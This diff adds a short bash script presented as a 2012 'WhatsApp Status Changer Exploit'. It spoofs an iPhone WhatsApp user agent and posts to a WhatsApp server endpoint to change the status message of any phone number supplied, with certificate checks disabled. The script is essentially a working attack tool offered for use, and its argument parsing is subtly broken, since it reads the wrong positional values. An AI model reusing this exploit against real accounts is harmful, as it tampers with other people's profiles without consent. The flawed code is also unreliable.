@@ -1,0 +1,68 @@
+#!/bin/bash
+#
+# WhatsApp Status changer v0.2 stable
+# A slim exploit able to change the WhatsApp
+# user status in a remote way.
+#
+# This program is released under the terms of the GNU General Public License
+# (GPL), which is distributed with this software in the file "COPYING".
+# The GPL specifies the terms under which users may copy and use this software.
+#
+ 
+show_help(){
+  echo ""
+  echo " 2012 (C) WhatsApp-exp.sh - The Whats App Status Changer Exploit"
+  echo ""
+  echo " --usage    show the exploit Usage"
+  echo " --credits  show the exploit Credits"
+  echo " --help     show the Help"
+  echo ""
+  echo " enJoy"
+}
+ 
+show_credits(){
+  echo ""
+  echo " Emanuele Gentili"
+  echo " http://www.emanuelegentili.eu"
+  echo " eg @ offensive-security.it"
+  echo ""
+  echo " Stefano Fratepietro"
+  echo " http://steve.deftlinux.net"
+  echo " stefano @ deftlinux.net"
+  echo ""
+
+}
+ 
+show_usage(){
+  echo ""
+  echo " 2012 (C) WhatsApp-exp.sh - The Whats App Status Changer Exploit"
+  echo ""
+  echo " usage $0 --countrycode 39 --mobilenum 3931212343 --text g0t p0wned"
+  echo ""
+  echo " enJoy"
+}
+
+
+# Bash
+while [[ $# != 0 ]]; do
+    arg_name=$1; shift
+    case "$arg_name" in
+      --help|-?|-h) show_help; exit 0;;
+      --credits) show_credits; exit 0;;
+      --usage) show_usage; exit 0;;
+      --countrycode) countrycode=$1; shift;;
+      --mobilenum) mobilenum=$2; shift;;
+      --text) text=$3; shift;;
+      *) echo "invalid option: $1"; show_help;exit 1;;
+    esac
+done
+ 
+[ -z "$countrycode" ] && { show_help; exit 1; }
+
+whatsAppagent="WhatsApp/2.6.7 iPhone_OS/5.0.1 Device/Unknown_(iPhone4,1)"
+
+wget --no-cache --delete-after --quiet --no-check-certificate --user-agent="$whatsAppagent" --post-data="cc=$countrycode&me=$mobilenum&s=$text" https://s.whatsapp.net/client/iphone/u.php
+
+echo ""
+echo "[+] Operazione completata."
+echo ""
